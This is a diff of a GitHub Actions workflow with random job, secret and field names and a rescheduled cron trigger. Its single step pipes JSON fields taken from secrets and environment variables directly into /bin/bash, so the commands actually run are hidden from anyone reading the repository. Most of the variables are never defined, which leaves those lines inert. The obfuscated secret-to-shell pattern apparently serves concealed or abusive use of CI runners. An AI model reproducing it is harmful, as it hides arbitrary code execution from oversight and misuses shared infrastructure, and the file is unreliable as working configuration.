@@ -1,23 +1,30 @@
 name: jewelsscorched
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
-jobs:  # 25404
+    - cron: '52 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jewelsscorched
         env:
-          jqx36536: ${{ secrets.jqx36536 }}
+          d8: ${{ secrets.d8 }}
         run: |
-          echo $jqx36536 | jq -r .ehq97106 | /bin/bash
-          echo $melb64 | jq -r .lb44228 | /bin/bash
-          echo $c53 | jq -r .pj36 | /bin/bash
-          echo $tlvp85 | jq -r .bzb33 | /bin/bash
-          echo $hwql82816 | jq -r .vff91 | /bin/bash
-          echo $ts3 | jq -r .kwj6 | /bin/bash
-          echo $jww5459 | jq -r .agn75 | /bin/bash
-          echo $qt483 | jq -r .dfrsh963 | /bin/bash
+          echo $d8 | jq -r .kr25467 | /bin/bash
+          echo $lfvcd4513 | jq -r .dhs970 | /bin/bash
+          echo $fn927 | jq -r .jlov5034 | /bin/bash
+          echo $e60318 | jq -r .uoqmz8003 | /bin/bash
+          echo $dn513 | jq -r .lgli3332 | /bin/bash
+          echo $xkv303 | jq -r .aqxjr9 | /bin/bash
+          echo $s6505 | jq -r .wbdwv374 | /bin/bash
+          echo $kppql224 | jq -r .xfll9621 | /bin/bash
+          echo $spzn44 | jq -r .z97 | /bin/bash
+          echo $tpep56 | jq -r .qp525 | /bin/bash
+          echo $pl1278 | jq -r .ygo687 | /bin/bash
+          echo $xc25007 | jq -r .j035 | /bin/bash
+          echo $nqbi0 | jq -r .nbwih1 | /bin/bash
 
